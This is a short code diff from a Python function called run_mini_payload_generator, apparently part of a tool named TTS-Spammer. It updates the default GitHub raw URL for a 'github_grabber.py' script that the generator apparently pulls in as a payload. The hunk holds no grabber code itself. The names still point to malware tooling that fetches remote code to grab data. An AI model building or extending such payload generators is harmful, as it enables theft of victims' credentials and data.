@@ -149,7 +149,7 @@ def run_mini_payload_generator():
         return
 
     print()
-    default_github_url = "https://raw.githubusercontent.com/SellMeFish/TTS-Spammer/main/utils/github_grabber.py"
+    default_github_url = "https://raw.githubusercontent.com/SellMeFish/TTS-Spammer/refs/heads/main/utils/grabbers/github_grabber.py"
     github_url = input(rgb(255, 32, 32) + center(f"Enter GitHub Raw URL (Enter for default): ") + '\033[0m')
     if not github_url or not github_url.strip():
         github_url = default_github_url
